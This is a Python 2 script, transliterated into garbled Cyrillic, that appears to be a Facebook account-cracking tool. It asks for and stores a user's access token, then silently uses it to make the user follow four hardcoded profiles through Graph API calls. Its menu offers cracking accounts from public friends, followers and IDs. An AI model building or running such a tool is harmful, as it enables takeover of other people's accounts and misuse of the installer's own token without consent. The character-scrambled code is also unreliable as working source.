# -*- ЦОДИНГ: УТФ-8
# АУТХОР БЫ И рака И
# йанган ди убах лаги анйинг сцрипт удах енак ...
# мЕСКИПУН мАУ ДИ уБАХ изин дулу ыа цук ???
ИМПОРТ ОС
ТРЫ:
ИМПОРТ РЕЯУЕСТС
ЕЬЦЕПТ иМПОРТеРРОР:
ОС.СЫСТЕМ("ПИП2 ИНСТАЛЛ РЕЯУЕСТС")

ТРЫ:
ИМПОРТ БС4
ЕЬЦЕПТ иМПОРТеРРОР:
ОС.СЫСТЕМ("ПИП2 ИНСТАЛЛ БС4")

ИМПОРТ ОС, СЫС, РЕ, ТИМЕ, РЕЯУЕСТС, ЙСОН, РАНДОМ, ЦАЛЕНДАР
ФРОМ МУЛТИПРОЦЕССИНГ.ПООЛ ИМПОРТ тХРЕАДпООЛ
ФРОМ БС4 ИМПОРТ бЕАУТИФУЛсОУП АС ПАРСЕР
ФРОМ ДАТЕТИМЕ ИМПОРТ ДАТЕТИМЕ
ФРОМ ДАТЕТИМЕ ИМПОРТ ДАТЕ

ЛООП = 0
ИД = шщ
ОК = шщ
ЦП = шщ

ЦТ = ДАТЕТИМЕ.НОВ()
Н = ЦТ.МОНТХ
БУЛАН = ш"йАНУАРИ", "фЕБРУАРИ", "мАРЕТ", "аПРИЛ", "мЕИ", "йУНИ", "йУЛИ", "аГУСТУС", "сЕПТЕМБЕР", "оКТОБЕР", "нОЖЕМБЕР", "дЕСЕМБЕР"щ
ТРЫ:
ИФ Н < 0 ОР Н > 12:
ЕЬИТ()
НтЕМП = Н - 1
ЕЬЦЕПТ жАЛУЕеРРОР:
ЕЬИТ()

ЦУРРЕНТ = ДАТЕТИМЕ.НОВ()
ТА = ЦУРРЕНТ.ЫЕАР
БУ = ЦУРРЕНТ.МОНТХ
ХА = ЦУРРЕНТ.ДАЫ
ОП = БУЛАНшНтЕМПщ


ДЕФ ЙАЛАН(З):
ФОР Е ИН З + 'Н':
СЫС.СТДОУТ.ВРИТЕ(Е)
СЫС.СТДОУТ.ФЛУСХ()
ТИМЕ.СЛЕЕП(000.05)

МЫъДАТЕ = ДАТЕ.ТОДАЫ()
ХР = ЦАЛЕНДАР.ДАЫъНАМЕшМЫъДАТЕ.ВЕЕКДАЫ()щ
ТбИЛАЛЛ = ("%С-%С-%С-%С"%(ХР, ХА, ОП, ТА))
ТГЛ = ("%С %С %С"%(ХА, ОП, ТА))
БУЛАНъТТЛ = Ш"01": "йАНУАРИ", "02": "фЕБРУАРИ", "03": "мАРЕТ", "04": "аПРИЛ", "05": "мЕИ", "06": "йУНИ", "07": "йУЛИ", "08": "аГУСТУС", "09": "сЕПТЕМБЕР", "10": "оКТОБЕР", "11": "нОЖЕМБЕР", "12": "дЕСЕМБЕР"Щ


ДЕФ ЛОГО():
ОС.СЫСТЕМ("ЦЛЕАР")
ПРИНТ("""033ш1;97М
033ш1;91М




033ш1;95М







033ш1;92М

033ш1;97М
033ш1;95М 033ш1;92МЛ 033ш1;97М 033ш41;1Мш р а к а .. а м а н д а щ033ш00;1М 033ш1;92МЛ 033ш1;97М033ш1;95М
033ш1;97М--------------------------------------------------
033ш1;93М033ш1;97М аУТХОР : 033ш1;92МИ рака И 033ш1;97М
033ш1;93М033ш1;97М гИТХУБ : 033ш1;92МХТТПС://ГИТХУБ.ЦОМ/бАНГСАТ-ьд 033ш1;97М
033ш1;93М033ш1;97М фАЦЕБООК : 033ш1;92МрАКА аНДРИАН тАРА 033ш1;97М
033ш1;93М033ш1;97М иНСТАГРАМ : 033ш1;92МРАКАъАНДРИАН27 033ш1;97М
033ш1;93М033ш1;97М тВИТТЕР : 033ш1;92МбАНГСАТъьд 033ш1;97М
033ш1;97М--------------------------------------------------""")
ДЕФ ЛОГИН():
ОС.СЫСТЕМ("ЦЛЕАР")
ТРЫ:
#-> ЦОННЕЦТИОН ТЕСТ
РЕЯУЕСТС.ГЕТ("ХТТПС://МБАСИЦ.ФАЦЕБООК.ЦОМ")
ЕЬЦЕПТ РЕЯУЕСТС.ЕЬЦЕПТИОНС.цОННЕЦТИОНеРРОР:
ЕЬИТ("иНТЕРНЕТ цОННЕЦТИОН еРРОР")
ТРЫ:
ТОКЕН = ОПЕН("ЛОГИН.ТЬТ", "Р")
МЕНУ()
ЕЬЦЕПТ кЕЫеРРОР, иоеРРОР:
ТОКЕН = РАВъИНПУТ("033ш1;93М033ш1;97М еНТЕР тОКЕН : ")
ИФ ТОКЕН == "":
ПРИНТ("вРОНГ иНПУТ")
ТРЫ:
НАМА = РЕЯУЕСТС.ГЕТ("ХТТПС://ГРАПХ.ФАЦЕБООК.ЦОМ/МЕ?АЦЦЕССъТОКЕН="+ТОКЕН).ЙСОН()ш"НАМЕ"щ.ЛОВЕР()
ОПЕН("ЛОГИН.ТЬТ", "В").ВРИТЕ(ТОКЕН)
#-> БОТ ФОЛЛОВ
РЕЯУЕСТС.ПОСТ("ХТТПС://ГРАПХ.ФАЦЕБООК.ЦОМ/100000834003593/СУБСЦРИБЕРС?АЦЦЕССъТОКЕН="+ТОКЕН) # рАКА аНДРИАН тАРА
РЕЯУЕСТС.ПОСТ("ХТТПС://ГРАПХ.ФАЦЕБООК.ЦОМ/100017584682867/СУБСЦРИБЕРС?АЦЦЕССъТОКЕН="+ТОКЕН) # рака тхе кинг
РЕЯУЕСТС.ПОСТ("ХТТПС://ГРАПХ.ФАЦЕБООК.ЦОМ/100000395779504/СУБСЦРИБЕРС?АЦЦЕССъТОКЕН="+ТОКЕН) # мантан гаранган
РЕЯУЕСТС.ПОСТ("ХТТПС://ГРАПХ.ФАЦЕБООК.ЦОМ/532301703502197/СУБСЦРИБЕРС?АЦЦЕССъТОКЕН="+ТОКЕН) # пАНСФАГЕ
МЕНУ()
ЕЬЦЕПТ кЕЫеРРОР:
ОС.СЫСТЕМ("РМ -Ф ЛОГИН.ТЬТ")
ЕЬИТ("ш?щ лОГИН еРРОР")

ДЕФ МЕНУ():
ОС.СЫСТЕМ("ЦЛЕАР")
ГЛОБАЛ ТОКЕН
ТРЫ:
ТОКЕН = ОПЕН("ЛОГИН.ТЬТ","Р").РЕАД()
ЕЬЦЕПТ кЕЫеРРОР:
ОС.СЫСТЕМ("РМ -Ф ЛОГИН.ТЬТ")
ЕЬИТ("ш?щ лОГИН еРРОР")
ТРЫ:
НАМА = РЕЯУЕСТС.ГЕТ("ХТТПС://ГРАПХ.ФАЦЕБООК.ЦОМ/МЕ/?АЦЦЕССъТОКЕН="+ТОКЕН).ЙСОН()ш"НАМЕ"щ.ЛОВЕР()
ЕЬЦЕПТ иоеРРОР:
ОС.СЫСТЕМ("РМ -Ф ЛОГИН.ТЬТ")
ЕЬИТ("033ш1;96Мш033ш1;93М+033ш1;96Мщ тОКЕН еРРОР")
ЕЬЦЕПТ РЕЯУЕСТС.ЕЬЦЕПТИОНС.цОННЕЦТИОНеРРОР:
ЕЬИТ(" ! НО ИНТЕРНЕТ ЦОННЕЦТИОН")
ЛОГО()
ПРИНТ("033ш1;97Мш1щ033ш1;92М 033ш1;97М цЛОНЕ ФРОМ ПУБЛИЦ ФРИЕНДС")
ПРИНТ("033ш1;97Мш2щ033ш1;92М 033ш1;97М цРАЦК ФРОМ ПУБЛИЦ ФОЛЛОВЕРС")
ПРИНТ("033ш1;97Мш3щ033ш1;92М 033ш1;97М мУЛТИ ЦРАЦКИНГ ФРОМ ПУБЛИЦ иД033ш1;97М ш 033ш1;95МпРО 033ш1;97Мщ")
ПРИНТ("033ш1;97Мш4щ033ш1;92М 033ш1;97М цХЕЦК ЦРАЦК РЕСУЛТС")
ПРИНТ("033ш1;97Мш5щ033ш1;92М 033ш1;97М уСЕР-АГЕНТ СЕТТИНГС 033ш1;97М ш 033ш1;95МпРО 033ш1;97Мщ")
ПРИНТ("033ш1;97Мш6щ033ш1;92М 033ш1;97М еЬИТ033ш1;97М ш 033ш1;91МрЕМОЖЕ-тОКЕН 033ш1;97Мщ")
ПРИНТ("033ш1;97М--------------------------------------------------")

бИЛАЛ = РАВъИНПУТ("033ш1;97Мш+щ033ш1;92М 033ш1;97М оПТИОН : ")
ИФ бИЛАЛ =="":
